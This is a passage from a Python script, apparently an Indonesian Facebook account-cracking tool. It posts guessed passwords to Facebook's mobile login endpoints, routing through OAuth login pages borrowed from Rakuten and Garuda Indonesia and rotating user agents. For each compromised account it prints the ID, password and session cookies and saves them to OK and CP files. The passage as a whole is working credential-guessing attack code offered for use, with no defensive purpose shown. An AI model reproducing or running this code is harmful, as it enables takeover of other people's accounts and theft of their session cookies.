			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=214330088590858&kid_directed_site=0&app_id=214330088590858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D214330088590858%26cbt%3D1697129832904%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1fcb9c5433c3d8%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%26client_id%3D214330088590858%26display%3Dtouch%26domain%3Dwww.rakuten.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.rakuten.com%252Fauth%252Fv2%252Fsignup%26locale%3Den_US%26logger_id%3Df7d38fdc049d7c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff6d8bfb35904%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%2526frame%253Df2e2d2e7c020ba4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ff6d8bfb35904%26domain%3Dwww.rakuten.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.rakuten.com%252Ff2ff502629de584%26relation%3Dopener%26frame%3Df2e2d2e7c020ba4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=214330088590858&kid_directed_site=0&app_id=214330088590858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D214330088590858%26cbt%3D1697129832904%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1fcb9c5433c3d8%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%26client_id%3D214330088590858%26display%3Dtouch%26domain%3Dwww.rakuten.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.rakuten.com%252Fauth%252Fv2%252Fsignup%26locale%3Den_US%26logger_id%3Df7d38fdc049d7c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff6d8bfb35904%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%2526frame%253Df2e2d2e7c020ba4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ff6d8bfb35904%26domain%3Dwww.rakuten.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.rakuten.com%252Ff2ff502629de584%26relation%3Dopener%26frame%3Df2e2d2e7c020ba4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=214330088590858&kid_directed_site=0&app_id=214330088590858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D214330088590858%26cbt%3D1697129832904%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1fcb9c5433c3d8%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%26client_id%3D214330088590858%26display%3Dtouch%26domain%3Dwww.rakuten.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.rakuten.com%252Fauth%252Fv2%252Fsignup%26locale%3Den_US%26logger_id%3Df7d38fdc049d7c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff6d8bfb35904%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%2526frame%253Df2e2d2e7c020ba4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ff6d8bfb35904%26domain%3Dwww.rakuten.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.rakuten.com%252Ff2ff502629de584%26relation%3Dopener%26frame%3Df2e2d2e7c020ba4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'')
				print(f'{k} [CEKPOINT]{x} ')
				print(f'{x} USERNAME : {k}{idf}{x} PASSWORD : {k}{pw}{x}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'')
				print(f'{h} [SUKSES]{x}')
				print(f'{x} USERNAME : {h}{idf}{x} PASSWORD : {h}{pw}{x}')
				print(f'{x} COOKIE : {kuki}{x}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---------------------[ METHODE-ASYNC ]---------------------#
def crackasync(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([m,k,h,u,b])
	sys.stdout.write(f"\r {ewe} {x}{(loop)}/{len(id)} ok:{h}{(ok)} {x}cp:{k}{(cp)}{x}")
	sys.stdout.flush()
	ua= random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2077467505731265&kid_directed_site=0&app_id=2077467505731265&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D2077467505731265%26auth_type%26cbt%3D1695072538219%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d0d30a5bc6e8%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener%26client_id%3D2077467505731265%26config_id%26display%3Dtouch%26domain%3Dwww.garuda-indonesia.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Fid%252Fid%252Findex-alternate%26force_confirmation%3Dfalse%26id%3Df1acb5d53e0da88%26locale%3Den_US%26logger_id%3D823305df-d54f-472f-855d-20679d21695e%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1475beac6cd4e%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener.parent%2526frame%253Df1acb5d53e0da88%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1475beac6cd4e%26domain%3Dwww.garuda-indonesia.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Ff1684aa861e868c%26relation%3Dopener.parent%26frame%3Df1acb5d53e0da88%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2077467505731265&kid_directed_site=0&app_id=2077467505731265&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D2077467505731265%26auth_type%26cbt%3D1695072538219%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d0d30a5bc6e8%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener%26client_id%3D2077467505731265%26config_id%26display%3Dtouch%26domain%3Dwww.garuda-indonesia.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Fid%252Fid%252Findex-alternate%26force_confirmation%3Dfalse%26id%3Df1acb5d53e0da88%26locale%3Den_US%26logger_id%3D823305df-d54f-472f-855d-20679d21695e%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1475beac6cd4e%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener.parent%2526frame%253Df1acb5d53e0da88%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1475beac6cd4e%26domain%3Dwww.garuda-indonesia.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Ff1684aa861e868c%26relation%3Dopener.parent%26frame%3Df1acb5d53e0da88%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=2077467505731265&auth_token=9100f8f4d4b33838e6914a9f474bde76&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D2077467505731265%26auth_type%26cbt%3D1695072538219%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d0d30a5bc6e8%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener%26client_id%3D2077467505731265%26config_id%26display%3Dtouch%26domain%3Dwww.garuda-indonesia.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Fid%252Fid%252Findex-alternate%26force_confirmation%3Dfalse%26id%3Df1acb5d53e0da88%26locale%3Den_US%26logger_id%3D823305df-d54f-472f-855d-20679d21695e%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1475beac6cd4e%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener.parent%2526frame%253Df1acb5d53e0da88%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2077467505731265&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1475beac6cd4e%26domain%3Dwww.garuda-indonesia.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Ff1684aa861e868c%26relation%3Dopener.parent%26frame%3Df1acb5d53e0da88%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'')
				print(f'{k} [CEKPOINT]{x} ')
				print(f'{x} USERNAME : {k}{idf}{x} PASSWORD : {k}{pw}{x}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'')
				print(f'{h} [SUKSES]{x}')
				print(f'{x} USERNAME : {h}{idf}{x} PASSWORD : {h}{pw}{x}')
				print(f'{x} COOKIE : {kuki}{x}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login123()